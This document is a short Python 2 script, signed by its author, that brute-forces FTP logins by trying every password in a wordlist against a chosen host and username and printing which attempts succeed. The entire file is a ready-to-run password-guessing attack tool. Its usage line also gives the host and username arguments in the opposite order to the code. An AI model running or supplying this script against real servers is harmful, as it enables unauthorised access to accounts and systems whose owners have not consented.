from ftplib import FTP
from termcolor import colored
import sys
print colored('[+]############################[+]','magenta')
print colored('[+]############################[+]','magenta')
print colored('[+] CODED  BY : HAMZA ETTALABI![+]','magenta')
print colored('[+]############################[+]','magenta')
print colored('[+]############################[+]','magenta')
print colored('usage : python ftp.py [username] [host] [wordlist]', 'cyan')
host = str(sys.argv[1])
username = str(sys.argv[2])
liste = str(sys.argv[3])
f = open(liste, 'r')
passwd = f.read().splitlines()
for password in passwd:
	try:
		ft = FTP(host)
		ft.login(username,password)
		print colored('username : '+username+' password : '+password+' found', 'green')
		exit()
	except Exception, e:
			print colored('username : '+username+' password : '+password+' not found', 'red')
